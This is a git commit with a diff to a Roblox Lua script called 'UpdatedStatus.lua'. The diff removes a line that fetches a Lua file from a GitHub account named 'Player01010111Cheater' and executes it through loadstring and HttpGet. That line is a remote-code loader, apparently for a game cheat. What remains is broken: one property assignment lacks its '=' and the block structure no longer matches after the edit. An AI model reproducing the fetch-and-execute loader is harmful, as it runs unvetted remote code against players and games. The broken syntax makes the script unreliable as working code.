7fc7df4edcef1f3ffc6723d728c638e8252bf484
Easy lua <staskuzmin1406@gmail.com>
2024-11-13 15:41:03 +0300

    Update UpdatedStatus.lua

--- UpdatedStatus.lua
+++ UpdatedStatus.lua
@@ -2,9 +2,7 @@ local folderofupdate = Instance.new("Folder")
 folderofupdate.Parent = workspace
 folderofupdate.Name "UpdateFolder"
 while wait(10) do
-  if workspace.UpdateFolder.UpdateStatus.Value == true then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Player01010111Cheater/King-legacy-project/refs/heads/main/Souce.lua"))()
-  else
+
     for _, v in pairs(workspace.UpdateFolder:GetDescendants()) do
       if v.Name == "UpdateStatus" then
         v:Destroy()
@@ -13,7 +11,6 @@ while wait(10) do
         Update.Name = "UpdateStatus"
         Update.Parent = workspace
         Update.Value = false
-      end
     end
   end
 end
